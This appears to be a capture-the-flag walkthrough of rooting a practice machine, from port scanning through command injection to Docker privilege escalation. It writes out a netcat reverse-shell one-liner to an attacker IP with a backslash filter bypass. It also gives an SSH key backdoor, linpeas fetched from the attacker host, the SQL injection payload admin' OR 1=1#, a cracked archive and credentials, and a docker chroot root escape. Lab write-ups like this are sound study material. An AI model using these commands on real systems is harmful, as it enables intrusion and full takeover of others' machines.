**Target Ip :** 
```
10.49.160.137
```

-----------
# Scanning using RustScan 

```
rustscan -a 10.49.160.137 -- -sC -sV 
```

We found the following open ports : 
```
Open 10.49.160.137:22
Open 10.49.160.137:21
Open 10.49.160.137:80
```

The following services were running on the server :
![[Pasted image 20260209215212.png]]

A web service was running on **port 80**.

---
Now we are trying to find the subdomains :

```
subfinder -d http://10.49.160.137
```

![[Pasted image 20260209215314.png]]

We would not find any subdomains.

---
Now we are trying to find the directories :

```
dirsearch -u "http://10.49.160.137"
```
![[Pasted image 20260209215627.png]]

**From these we found a juicy directory :**
```
http://10.49.160.137/secret/ 
```

---
We are trying to login with ftp 
![[Pasted image 20260209223506.png]]

```
ftp 10.49.160.137 
```

we found a note.txt file. Lets download it -

```
get note.txt
```

```
cat note.txt 

Anurodh told me that there is some filtering on strings being put in the command 
-- Apaar
```

Here we got  two name : 
Anurodh 

Apaar

---
Now lets try command Injection :

If we try ls it filters the command
![[Pasted image 20260209225117.png]]

But if we use `\` with command `l\s` then it doesn't filters it.

![[Pasted image 20260209225434.png]]

But before executing the command we simply make rm > r\m .
```
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.209.139 8888 >/tmp/f
```

```
nc -lvnp 8888
```

![[Pasted image 20260209225622.png]]

Now we use the command to stabilize the shell.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---
Now we go to the ==`/home/apaar`== directory.

```
sudo -l
```

![[Pasted image 20260209231214.png]]
We can use the **==`helpline.sh`==** without password.

Running .helpline.sh as Apaar with the command :
```
sudo -u apaar /home/apaar/.helpline.sh
```

This 
![[Pasted image 20260209231739.png]]

Now we trick this to bypass the shell script and finally we got access to the **==`apaar`==** user using the command injection ==`/bin/sh`== :
![[Pasted image 20260209231905.png]]

**Finally we got the user flag :**
![[Pasted image 20260209232058.png]]

I wanted to try and get a better shell environment to not have to go through the same steps again so I created an SSH key pair using ssh-keygen. This gives me a Public and Private key.

==`passphrase`== : A passphrase is like a password for your private SSH key.

I use the passphrase ==`ranger`==  we can also avoid it by just only clicking ==`enter`==
![[Pasted image 20260209235549.png]]

Another way :
![[Pasted image 20260210002350.png]]

go to .ssh folder to get the key :
![[Pasted image 20260210002537.png]]

Now copy the ==id_rsa.pub== key and paste it into victims ==authorized_keys==
![[Pasted image 20260210003113.png]]

Now give the 400 permissioon to the key and connect through ssh :
![[Pasted image 20260210003249.png]]

Then download linpeas.sh file and start a python server on attacker machine :
https://github.com/peass-ng/PEASS-ng/releases/tag/20260201-2ddf3a96

![[Pasted image 20260210004509.png]]

Download the file from attacker machine :
```
wget 192.168.209.139/linpeas.sh
```

Now give executable permission and execute the file :
```
chmod +x linpeas.sh 
./linpeas.sh 
```

==`linpeas.sh`== is a Linux privilege-escalation enumeration script.

![[Pasted image 20260210004837.png]]

After linpeas had finished, while checking its results, 2 active listening ports looked very interesting. Port 9001 and Port 3306.

Basically Port 3306 used for MySQL but we dont know about 9001.
![[Pasted image 20260210005917.png]]

As the port 9001 running on local Ip
Now we use port forwarding to access it because this service was accessible on localy.

```
ssh -L 6969:127.0.0.1:9001 apaar@10.49.160.137   //Do it attacker machine
```
![[Pasted image 20260210012108.png]]

```
http://127.0.0.1:6969/
```
![[Pasted image 20260210011904.png]]

This website was vulnerable to SQL Injection :
Payload : ==`admin' OR 1=1#`==

![[Pasted image 20260210015155.png]]
Now Download the hacker image it might contains something.

Now we use steghide to extract the image :
```
steghide extract -sf  hacker-with-laptop_23-2147985341.jpg
```

![[Pasted image 20260210020826.png]]

After extracting the stegnography we got a ==`backup.sh`== file.
```
zip2john backup.zip > hash
john hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
unzip backup.zip      //password : pass1word
```

![[Pasted image 20260210021008.png]]
![[Pasted image 20260210021102.png]]

```
cat source_code.php 
```

![[Pasted image 20260210021152.png]]

```
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd 
```

SSH Password : ==`!d0ntKn0wmYp@ssw0rd`==
```
ssh anurodh@10.49.160.137   
```

```
id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

---
#### Docker Privilege Escalation

Now we have to exploit docker :
https://gtfobins.org/gtfobins/docker/
```
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

![[Pasted image 20260210021319.png]]